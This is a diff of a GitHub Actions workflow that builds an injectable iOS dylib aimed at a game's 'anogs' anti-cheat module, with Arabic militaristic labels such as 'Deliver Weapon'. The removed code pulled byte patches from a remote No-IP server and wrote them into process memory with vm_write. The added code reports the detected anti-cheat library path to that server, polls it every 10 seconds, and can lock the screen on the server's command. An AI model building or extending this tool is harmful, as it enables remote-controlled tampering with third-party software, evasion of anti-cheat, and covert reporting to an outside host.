@@ -1,14 +1,13 @@
-name: Sovereign-NoIP-Uplink-v350k
+name: Sovereign-RealTime-Forge-v70k
 on: [push, workflow_dispatch]
 
 jobs:
   build:
-    name: "صهر سلاح البصرة السيادي للجنرال وسام"
     runs-on: macos-latest
     steps:
-      - name: "تجهيز النخاع البرمجي"
+      - name: Sovereign Ignition
         run: |
-          echo "🔥 بدء تشغيل مفاعل البصرة (نسخة الرادار الثابت: jojolmlm.hopto.org)..."
+          echo "🔥 بدء تشغيل مفاعل البصرة (نسخة النبض المستمر والمستشعر الذكي)..."
           
           cat << 'EOF' > wsam_core.mm
           #import <UIKit/UIKit.h>
@@ -16,15 +15,16 @@ jobs:
           #import <mach/mach.h>
           #import <Foundation/Foundation.h>
 
-          // [🎯] إحداثيات مركز القيادة الثابتة (No-IP)
+          // [🎯] إحداثيات مركز القيادة - سيرفر الجنرال وسام (No-IP)
           #define SERVER_API @"http://jojolmlm.hopto.org/dashboard_v60.php?api=true"
 
-          @interface SovereignNoIPUI : UIView
+          @interface SovereignUI : UIView
           @property (nonatomic, strong) UILabel *statusLabel;
           @property (nonatomic, strong) UIView *statusLamp;
+          @property (nonatomic, strong) NSString *lastMessage;
           @end
 
-          @implementation SovereignNoIPUI
+          @implementation SovereignUI
           - (instancetype)initWithFrame:(CGRect)frame {
               self = [super initWithFrame:frame];
               if (self) {
@@ -34,15 +34,10 @@ jobs:
                   self.layer.borderColor = [UIColor cyanColor].CGColor;
                   self.layer.borderWidth = 1.5;
                   
-                  self.layer.shadowColor = [UIColor cyanColor].CGColor;
-                  self.layer.shadowOffset = CGSizeMake(0, 0);
-                  self.layer.shadowRadius = 10;
-                  self.layer.shadowOpacity = 0.6;
-                  
-                  self.statusLabel = [[UILabel alloc] initWithFrame:CGRectMake(15, 8, 170, 20)];
-                  self.statusLabel.text = @"جاري رصد إشارة No-IP...";
+                  self.statusLabel = [[UILabel alloc] initWithFrame:CGRectMake(15, 8, 190, 20)];
+                  self.statusLabel.text = @"جاري رصد إشارة السيادة...";
                   self.statusLabel.textColor = [UIColor yellowColor];
-                  self.statusLabel.font = [UIFont boldSystemFontOfSize:11];
+                  self.statusLabel.font = [UIFont boldSystemFontOfSize:10];
                   self.statusLabel.textAlignment = NSTextAlignmentCenter;
                   [self addSubview:self.statusLabel];
                   
@@ -50,56 +45,59 @@ jobs:
                   self.statusLamp.backgroundColor = [UIColor yellowColor];
                   self.statusLamp.layer.cornerRadius = 6;
                   [self addSubview:self.statusLamp];
+
+                  // [تكتيك المستشعر الذكي]: استخراج المسار وإرساله للسيرفر فوراً
+                  [self reportTargetFileSystem];
                   
-                  [self startCloudSync];
+                  // [تكتيك النبض المستمر]: بدء التحديث التلقائي كل 10 ثوانٍ
+                  [self startContinuousPolling];
               }
               return self;
           }
 
-          // [⚙️] محرك الحقن المليمتري المتوافق مع الرادار الثابت والأنكوس
-          - (void)applyPatches:(NSArray *)offsets {
-              uintptr_t slide = 0;
-              uint32_t imageCount = _dyld_image_count();
-              for (uint32_t i = 0; i < imageCount; i++) {
-                  const char *imageName = _dyld_get_image_name(i);
-                  // البحث عن المسار الدقيق: anogs.framework/anogs
-                  if (imageName && strstr(imageName, "anogs.framework/anogs") != NULL) {
-                      slide = _dyld_get_image_vmaddr_slide(i);
+          // =========================================================
+          // [📡] مستشعر النخاع الذكي - لقط مسار ملف الأنكوس
+          // =========================================================
+          - (void)reportTargetFileSystem {
+              NSString *detectedPath = @"File Not Found";
+              uint32_t count = _dyld_image_count();
+              for (uint32_t i = 0; i < count; i++) {
+                  const char *name = _dyld_get_image_name(i);
+                  if (name && (strstr(name, "angos") || strstr(name, "Shadow"))) {
+                      detectedPath = [NSString stringWithUTF8String:name];
                       break;
                   }
               }
-              if (slide == 0) slide = _dyld_get_image_vmaddr_slide(0);
-
-              mach_port_t task = mach_task_self();
-              for (NSDictionary *off in offsets) {
-                  uintptr_t addr = strtoull([off[@"address"] UTF8String], NULL, 16);
-                  uintptr_t target = slide + addr;
-                  NSString *hex = off[@"hex_val"];
-                  NSMutableData *data = [NSMutableData data];
-                  for (int i = 0; i + 2 <= hex.length; i += 2) {
-                      unsigned int v;
-                      [[NSScanner scannerWithString:[hex substringWithRange:NSMakeRange(i, 2)]] scanHexInt:&v];
-                      unsigned char c = (unsigned char)v;
-                      [data appendBytes:&c length:1];
-                  }
-                  vm_protect(task, (vm_address_t)target, data.length, FALSE, VM_PROT_READ | VM_PROT_WRITE | VM_PROT_COPY);
-                  vm_write(task, (vm_address_t)target, (vm_offset_t)data.bytes, (mach_msg_type_number_t)data.length);
-                  vm_protect(task, (vm_address_t)target, data.length, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);
-              }
+              
+              // إرسال المسار للسيرفر (تقرير استخباري)
+              NSString *reportURL = [NSString stringWithFormat:@"%@&report_path=%@", SERVER_API, 
+                                    [detectedPath stringByAddingPercentEncodingWithAllowedCharacters:[NSCharacterSet URLQueryAllowedCharacterSet]]];
+              
+              [[[NSURLSession sharedSession] dataTaskWithURL:[NSURL URLWithString:reportURL]] resume];
           }
 
-          - (void)startCloudSync {
-              NSURL *url = [NSURL URLWithString:SERVER_API];
-              NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:url];
-              [req setValue:@"Mozilla/5.0 (Sovereign/1.0)" forHTTPHeaderField:@"User-Agent"];
-              [req setHTTPMethod:@"GET"];
-              [req setTimeoutInterval:20.0];
+          // =========================================================
+          // [🔄] محرك النبض المستمر - التحديث التلقائي بدون خروج
+          // =========================================================
+          - (void)startContinuousPolling {
+              [self syncWithSovereignServer];
+              
+              // إعادة الاتصال كل 10 ثوانٍ مليمتر بمليمتر
+              dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(10 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
+                  [self startContinuousPolling];
+              });
+          }
 
-              [[[NSURLSession sharedSession] dataTaskWithRequest:req completionHandler:^(NSData *data, NSURLResponse *res, NSError *err) {
+          - (void)syncWithSovereignServer {
+              NSURL *url = [NSURL URLWithString:SERVER_API];
+              NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
+              [request setHTTPMethod:@"GET"];
+              [request setTimeoutInterval:5.0];
+
+              [[[NSURLSession sharedSession] dataTaskWithRequest:request completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
                   dispatch_async(dispatch_get_main_queue(), ^{
-                      if (err || !data) {
-                          self.statusLabel.text = @"الرادار معطل (No-IP)!";
-                          self.statusLamp.backgroundColor = [UIColor redColor];
+                      if (error || !data) {
+                          self.statusLamp.backgroundColor = [UIColor orangeColor];
                           return;
                       }
                       
@@ -107,86 +105,74 @@ jobs:
                       if (!json) return;
                       
                       NSString *status = json[@"system_status"];
-                      NSArray *payload = json[@"payload"];
+                      NSString *message = json[@"notification"];
                       int freeze = [json[@"maintenance_mode"] intValue];
 
+                      // [1] التحقق من أمر التجميد التلقائي
                       if (freeze == 1) {
-                          [self showLockdown:json[@"notification"]];
-                      } else if ([status isEqualToString:@"safe"]) {
-                          [self applyPatches:payload];
-                          self.statusLabel.text = [NSString stringWithFormat:@"سيادة ثابتة ✅ | حقن %lu", (unsigned long)payload.count];
+                          [self showImmediateLockdown:message];
+                          return;
+                      }
+
+                      // [2] تحديث النص واللمبة فوراً داخل اللعبة
+                      if (![self.lastMessage isEqualToString:message]) {
+                          self.statusLabel.text = message;
+                          self.lastMessage = message;
+                          
+                          // تأثير وميض عند استلام أمر جديد من البصرة
+                          [UIView animateWithDuration:0.3 animations:^{ self.alpha = 0.5; } completion:^(BOOL f){ self.alpha = 1.0; }];
+                      }
+
+                      if ([status isEqualToString:@"safe"]) {
                           self.statusLabel.textColor = [UIColor greenColor];
                           self.statusLamp.backgroundColor = [UIColor greenColor];
                           self.layer.borderColor = [UIColor greenColor].CGColor;
                       } else {
-                          self.statusLabel.text = json[@"notification"];
                           self.statusLabel.textColor = [UIColor redColor];
                           self.statusLamp.backgroundColor = [UIColor redColor];
+                          self.layer.borderColor = [UIColor redColor].CGColor;
                       }
                   });
               }] resume];
           }
 
-          - (void)showLockdown:(NSString *)m {
-              self.hidden = YES;
-              UIWindow *win = nil;
-              if (@available(iOS 13.0, *)) {
-                  for (UIWindowScene* scene in [UIApplication sharedApplication].connectedScenes) {
-                      if (scene.activationState == UISceneActivationStateForegroundActive) {
-                          win = scene.windows.firstObject; break;
-                      }
-                  }
-              }
-              if (!win) win = [UIApplication sharedApplication].keyWindow;
-              
-              if (win) {
-                  UIView *v = [[UIView alloc] initWithFrame:win.bounds];
-                  v.backgroundColor = [UIColor blackColor];
-                  UILabel *l = [[UILabel alloc] initWithFrame:v.bounds];
-                  l.text = [NSString stringWithFormat:@"🛑 صيانة عاجلة:\n%@", m];
-                  l.textColor = [UIColor whiteColor];
-                  l.textAlignment = NSTextAlignmentCenter;
-                  l.numberOfLines = 0;
-                  [v addSubview:l];
-                  [win addSubview:v];
-              }
+          - (void)showImmediateLockdown:(NSString *)m {
+              UIWindow *win = [[UIApplication sharedApplication] keyWindow];
+              if ([win viewWithTag:999]) return; // منع التكرار
+
+              UIView *v = [[UIView alloc] initWithFrame:win.bounds];
+              v.tag = 999;
+              v.backgroundColor = [UIColor blackColor];
+              UILabel *l = [[UILabel alloc] initWithFrame:v.bounds];
+              l.text = [NSString stringWithFormat:@"🛑 تجميد التحديث نشط:\n%@", m];
+              l.textColor = [UIColor whiteColor];
+              l.textAlignment = NSTextAlignmentCenter;
+              l.numberOfLines = 0;
+              [v addSubview:l];
+              [win addSubview:v];
           }
           @end
 
-          void __attribute__((constructor)) start_noip_engine() {
-              // تصحيح أقواس دالة الانتظار مليمتر بمليمتر
+          void __attribute__((constructor)) start_sovereign_engine() {
               dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(5 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
-                  UIWindow *win = nil;
-                  if (@available(iOS 13.0, *)) {
-                      for (UIWindowScene* scene in [UIApplication sharedApplication].connectedScenes) {
-                          if (scene.activationState == UISceneActivationStateForegroundActive) {
-                              win = scene.windows.firstObject; break;
-                          }
-                      }
-                  }
-                  if (!win) win = [UIApplication sharedApplication].keyWindow;
-                  
+                  UIWindow *win = [[UIApplication sharedApplication] keyWindow];
                   if (win) {
                       CGFloat screenWidth = [UIScreen mainScreen].bounds.size.width;
-                      SovereignNoIPUI *ui = [[SovereignNoIPUI alloc] initWithFrame:CGRectMake(screenWidth/2 - 110, 45, 220, 36)];
+                      SovereignUI *ui = [[SovereignUI alloc] initWithFrame:CGRectMake(screenWidth/2 - 110, 45, 220, 36)];
                       [win addSubview:ui];
                   }
               });
           }
           EOF
 
-          # مرحلة الصهر المعماري للدايلب (ARM64)
+          # مرحلة الصهر المعماري
           export SDK_PATH=$(xcrun --sdk iphoneos --show-sdk-path)
-          
-          # إضافة -Wno-deprecated-declarations لتجاهل تحذيرات آبل المزعجة
-          clang -dynamiclib -arch arm64 wsam_core.mm -o Sovereign_NoIP_Ready.dylib \
+          clang -dynamiclib -arch arm64 wsam_core.mm -o Sovereign_v70k.dylib \
           -isysroot $SDK_PATH -framework Foundation -framework UIKit -framework CoreGraphics \
           -Wno-deprecated-declarations -fobjc-arc -lc++ -Os
           
-          echo "✅ تمت عملية الصهر بنجاح يا سيادة الجنرال!"
-
-      - name: "تسليم الغنيمة (Upload Artifact)"
+      - name: Deliver Weapon
         uses: actions/upload-artifact@v4
         with:
-          name: Sovereign-NoIP-Ready
-          path: Sovereign_NoIP_Ready.dylib
+          name: Sovereign-v70k-Dylib
+          path: Sovereign_v70k.dylib
